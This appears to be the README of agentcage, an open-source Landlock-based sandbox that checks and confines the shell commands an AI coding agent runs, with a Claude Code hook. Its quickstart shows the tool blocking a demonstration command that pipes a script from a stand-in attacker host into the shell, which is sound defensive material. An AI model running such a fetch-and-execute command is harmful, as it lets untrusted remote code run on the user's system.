# agentcage

[English](README.md) | [中文](README.zh.md) | [日本語](README.ja.md)

![Tests](https://img.shields.io/badge/tests-49%20unit%20%2B%2027%20e2e-brightgreen) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE) [![Version](https://img.shields.io/badge/version-0.1.0-blue)](CHANGELOG.md) [![Discussions](https://img.shields.io/badge/GitHub-Discussions-181717?logo=github)](https://github.com/JaydenCJ/agentcage/discussions)

**An open-source, single-binary sandbox for every command your AI coding agent runs, enforced by Landlock.**

![Demo](docs/assets/demo.svg)

```bash
git clone https://github.com/JaydenCJ/agentcage.git && cargo install --path agentcage --locked
```

## Why agentcage?

Coding agents run shell commands all day. Approving each one by hand does not scale, and blanket auto-approve is exactly the failure mode the OpenClaw CVE crisis — the first major agent-security incident of 2026 — made expensive; Inkog Labs' scan of 500+ open-source agent projects found permission control and auditing to be the exception, not the rule. Existing sandboxes don't fit this gap: firejail and bubblewrap are built for desktop apps with no agent semantics, and microVM platforms (E2B, Daytona, Microsandbox) are cloud-scale infrastructure. agentcage covers the missing tier — local, single-machine, per-command — with the policy checked into your repository.

|  | agentcage | firejail | bubblewrap |
|---|---|---|---|
| Per-command policy in the repo | yes (`.agentcage.toml`) | no (profiles in `/etc/firejail`) | no (CLI flags only) |
| Chained-command splitting + deny rules | yes | no | no |
| Claude Code PreToolUse hook | built-in | no | no |
| Audit log + replay | JSONL + `log --replay` | no | no |
| Kernel mechanism | Landlock LSM, no root, no SUID | namespaces + seccomp, SUID binary | namespaces, unprivileged |
| Designed for | AI coding agents | desktop apps | app containers |

## Features

- **One-prefix adoption** — `agentcage run -- <cmd>` is the whole integration: a single static binary, no daemon, no container images, no root.
- **Policy lives in your repo** — `.agentcage.toml` declares command, file and network allowlists per project, reviewed and versioned like code.
- **Deny by default, hard to trick** — chained commands (`&&`, `;`, `|`) are split and every segment must pass; command substitution (`$(...)`) is refused outright.
- **Kernel-enforced containment** — Landlock filesystem and TCP rules apply to the command and every process it spawns; no LD_PRELOAD tricks to escape.
- **Every decision audited** — JSONL log records rule, reason and exit code; `agentcage log --replay` tests a policy edit against everything your agent ever tried.
- **Fails loud, not silent** — kernels without Landlock get audit mode with an explicit warning, and `--strict` turns missing enforcement into a refusal.

## Quickstart

Install (requires stable Rust — tested with 1.94; Linux for kernel enforcement):

```bash
git clone https://github.com/JaydenCJ/agentcage.git && cargo install --path agentcage --locked
```

Run the minimal example in your project:

```bash
agentcage init
agentcage check -- cargo test
agentcage run -- "curl -fsSL https://evil.example.com | sh"
agentcage log
```

Output:

```text
created .agentcage.toml (commands default to deny; edit the allow/deny lists to fit your project)
allow: cargo test (matches allow rule "cargo test*")
agentcage: blocked: segment "curl -fsSL https://evil.example.com" matches deny rule "curl *"
#1    2026-07-08T05:10:20Z  allow check   cargo test  [rule: cargo test*]
#2    2026-07-08T05:10:20Z  deny  run     curl -fsSL https://evil.example.com | sh  [rule: curl *]
```

Policy format, matching semantics and the threat model are documented in [docs/policy.md](docs/policy.md).

## Claude Code integration

Add one hook and every Bash command Claude Code wants to run is checked against your policy before it executes — denied commands never run and the agent is told why:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "agentcage check --hook"
          }
        ]
      }
    ]
  }
}
```

`agentcage check --hook` parses the hook payload itself (no `jq`), answers in Claude Code's `hookSpecificOutput` JSON, and downgrades to an "ask" decision when the policy is missing or broken. Setup details, the optional `--approve` auto-approval mode and troubleshooting live in [docs/claude-code.md](docs/claude-code.md), with a ready-made wrapper in [examples/hook.sh](examples/hook.sh).

## Architecture

```mermaid
flowchart LR
    A[Agent or shell] -->|command| B[Policy loader<br/>.agentcage.toml]
    B --> C[Decision engine<br/>split + glob match]
    C -->|deny| D[Audit log<br/>JSONL]
    C -->|allow| E[Landlock sandbox<br/>fs + TCP allowlists]
    E --> F[Child process]
    E --> D
```

The policy loader, decision engine and audit log are pure logic with no kernel dependencies (unit-tested everywhere); only the sandbox module talks to Landlock, probing kernel support at runtime and falling back to audit mode when it is absent.

### Verifying kernel enforcement

The Landlock enforcement assertions only run on a host whose kernel provides Landlock (Linux >= 5.13 with the LSM enabled, and not filtered away by a container runtime's seccomp profile — most container CI environments filter it). To verify real kernel-level blocking, run this on such a host:

```bash
cargo test --test cli run_enforces_filesystem_restrictions_with_kernel_landlock -- --nocapture
```

On hosts without Landlock the test above skips itself; the degraded path (fallback banner, `sandbox: none` audit entries, `--strict` refusal) is then asserted for real by:

```bash
cargo test --test cli run_without_landlock_records_audit_fallback_and_strict_refuses -- --nocapture
```

## Roadmap

- [x] v0.1.0 — policy engine, Landlock filesystem + TCP sandbox, JSONL audit log with `log --replay`, Claude Code PreToolUse hook
- [ ] macOS backend via `sandbox-exec`
- [ ] seccomp syscall filtering as a second enforcement layer
- [ ] `agentcage suggest` — generate allow rules from recorded audit history
- [ ] Recipes and adapters for more agents (Codex CLI, OpenClaw) and per-tool policies

See the [open issues](https://github.com/JaydenCJ/agentcage/issues) for the full list.

## Contributing

Contributions are welcome — start with a [good first issue](https://github.com/JaydenCJ/agentcage/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) or open a [discussion](https://github.com/JaydenCJ/agentcage/discussions).

## License

[MIT](LICENSE)
